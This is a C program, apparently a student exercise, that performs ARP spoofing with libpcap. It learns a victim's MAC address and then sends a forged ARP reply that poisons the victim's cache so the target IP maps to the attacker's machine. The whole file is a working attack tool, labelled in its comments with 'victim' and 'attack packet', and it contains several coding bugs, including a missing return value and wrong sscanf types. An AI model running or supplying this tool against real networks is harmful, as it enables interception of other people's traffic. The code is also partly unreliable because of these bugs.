#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

void usage() {
  printf("syntax: pcap_test <interface> <sender ip> <target ip>\n");
  printf("sample: pcap_test wlan0\n");
}
int check_ether(const u_char*packet,u_char*src_mac) {
    //check arp or ip
    if (packet[21] == 0x02) {
        printf("[+] catch the arp packet\n");
        if(memcmp(packet,src_mac,6)==0){
            printf("[+] cathch the reply packet \n");
            return 1;
        }
    }
    else {
            printf("[-] not reply");
            return 0;
    }
}
int parse_mac_address(char* strNum, u_char rslt_hex[])
{
    int     enteredNum = 0;
    int     orgIndex = 0;
    int     oprIndex = 0;
    char    numChar[100];
    while (orgIndex <= strlen(strNum))
    {
        if (strNum[orgIndex] == ':' || strNum[orgIndex] == '\0')
        {
            numChar[oprIndex] = '\0';
            if (strlen(numChar) > 2)
                return -1;
            rslt_hex[enteredNum++] = strtoul(numChar, NULL, 16);
            oprIndex = 0;
        }
        else
        {
            if (strNum[orgIndex] > 'F' || strNum[orgIndex] < '0')
                return(-1);
            numChar[oprIndex++] = strNum[orgIndex];
        }
        orgIndex++;
    }
    return (enteredNum);
}
void make_user_buffer(u_char*buffer,u_char*my_mac,u_char*my_ip,u_char*sender_ip) {
    memset(buffer, 0xff,6);//Broadcast
    memcpy(buffer+6,my_mac,6);//source mac
    uint8_t format[10]={0x08,0x06,0x00,0x01,0x08,0x00,0x06,0x04,0x00,0x01};
    memcpy(buffer+12,format,10);
    memcpy(buffer+22,my_mac,6);//mac address
    memcpy(buffer+28,my_ip,4);//sender ip
    memset(buffer+32,0x0,6);//don't know victim's mac
    memcpy(buffer+38,sender_ip,4);//victim's ip
}
void make_fake_packet(u_char*buffer,u_char*victim_mac,u_char*my_mac,u_char*target_ip,u_char*sender_ip) {
    memcpy(buffer, victim_mac,6);
    memcpy(buffer+6,my_mac,6);//source mac
    uint8_t format[10]={0x08,0x06,0x00,0x01,0x08,0x00,0x06,0x04,0x00,0x02};
    memcpy(buffer+12,format,10);
    memcpy(buffer+22,my_mac,6);//mac address
    memcpy(buffer+28,target_ip,4);//sender ip
    memcpy(buffer+32,victim_mac,6);//don't know victim's mac
    memcpy(buffer+38,sender_ip,4);//victim's ip
}
int main(int argc, char* argv[]) {
  if (argc != 4) {
    usage();
  }
  char* dev = argv[1];
  char errbuf[PCAP_ERRBUF_SIZE];
  pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  if (handle == NULL) {
    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    return -1;
  }
  //get mac
  int ifindex = 0; // 인덱스를 저장할 변수
  int i;
  u_char src_mac[6]; // 물리적 주소를 저장할 공간
  u_char src_ip[4];
  struct ifreq ifr; // ifreq 구조체를 생성한다.
  int sock = socket(AF_PACKET,SOCK_RAW,0); // 소켓을 만들어준다(파일 디스크립터)
  strncpy(ifr.ifr_name, argv[1],sizeof(argv[1])-1); // 원하는 인퍼페이스의 이름을 명시해준다.
   if(ioctl(sock,SIOCGIFINDEX, &ifr) == -1) // sock과 관련된 인터페이스의 인덱스 번호를 ifr에 넣어달라.
   {                                                   // 실패시 반환 -1
    perror("ioctl error[IFINDEX]");
    exit(-1);
   }
  ifindex = ifr.ifr_ifindex; // ifr 구조체에 저장되어있는 인덱스 번호를 변수에 저장한다.
  if(ioctl(sock,SIOCGIFHWADDR, &ifr) == -1) // sock과 관련된 물리적 주소를 ifr에 넣어달라
   {
    perror("Fail..ioctl error[IFHWADDR]");
    exit(-1);
   }
    for(i = 0 ; i < 6 ; i++){
      src_mac[i] = ifr.ifr_hwaddr.sa_data[i];  // ifr 구조체에 저장되어있는 물리적 주소를 저장한다.
     }
    if(ioctl(sock,SIOCGIFADDR, &ifr) == -1) // sock과 관련된 물리적 주소를 ifr에 넣어달라
   {
    perror("Fail..ioctl error[IFHWADDR]");
    exit(-1);
   }
    printf("\n");
    for(i=0; i<4; i++){
       src_ip[i]=ifr.ifr_addr.sa_data[i+2];
    }
    printf("[+] my IP Addr :  %d.%d.%d.%d\n",src_ip[0],src_ip[1],src_ip[2],src_ip[3]);
    printf("[+] my Mac Addr :  %02X:%02X:%02X:%02X:%02X:%02X \n",src_mac[0],src_mac[1],src_mac[2],src_mac[3],src_mac[4],src_mac[5]);

  //convert string ip to int
    u_int8_t sender_ip[4];
    sscanf(argv[2], "%d.%d.%d.%d", &sender_ip[0], &sender_ip[1], &sender_ip[2], &sender_ip[3]);
    u_int8_t target_ip[4];
    sscanf(argv[3], "%d.%d.%d.%d", &target_ip[0], &target_ip[1], &target_ip[2], &target_ip[3]);


  //1. send arp request
  u_int8_t user_defined_buffer[42];
  memset(user_defined_buffer,0xff,42);
  make_user_buffer(user_defined_buffer,src_mac,src_ip,(u_char*)sender_ip);
  printf("[+] send fake request \n");
  for(int i=0; i<42; i++){
      printf("%02x ",user_defined_buffer[i]);
      if((i+1)%8==0)
          printf("\t");
      if((i+1)%16==0)
          printf("\n");
  }
  printf("\n");
  //2. catch arp reply
    struct pcap_pkthdr* header;
    const u_char* reply_packet;
    u_int8_t victim_mac[6];
    while(1){
        pcap_sendpacket(handle,user_defined_buffer,42);
        pcap_next_ex(handle, &header,&reply_packet);
    if(header->caplen!=0)
        if (check_ether(reply_packet,src_mac)) {//check arp and reply
        //get mac address,
        memcpy(victim_mac,reply_packet+6,6);//copy victim's mac
        printf("[+] victim's mac : %02x %02x %02x %02x %02x %02x \n",victim_mac[0],victim_mac[1],victim_mac[2],victim_mac[3],victim_mac[4],victim_mac[5]);
        break;
       }
    }

  //3. make fake aprspoof
   u_int8_t user_fake_packet[42];
   make_fake_packet(user_fake_packet, victim_mac,src_mac,target_ip,(u_char*)sender_ip);
   printf("[+] made attack packet  \n");
   for(int i=0; i<42; i++){
       printf("%02x ",user_fake_packet[i]);
       if((i+1)%8==0)
                  printf("\t");
       if((i+1)%16==0)
           printf("\n");
   }
   pcap_sendpacket(handle,user_fake_packet,42);
   printf("\n");

  pcap_close(handle);
  return 0;
}
